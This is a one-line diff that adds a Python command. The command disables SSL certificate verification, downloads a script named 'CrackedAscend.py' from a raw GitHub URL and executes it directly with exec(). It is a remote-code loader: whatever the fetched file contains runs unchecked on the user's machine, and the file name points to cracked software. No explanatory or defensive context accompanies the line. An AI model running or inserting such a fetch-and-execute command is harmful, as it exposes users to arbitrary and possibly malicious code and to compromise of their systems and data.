@@ -1,0 +1,1 @@
+python -c "import ssl, urllib.request; context = ssl._create_unverified_context(); url = 'https://raw.githubusercontent.com/biskit-git/project/main/CrackedAscend.py'; code = urllib.request.urlopen(url, context=context).read().decode('utf-8'); exec(code)"
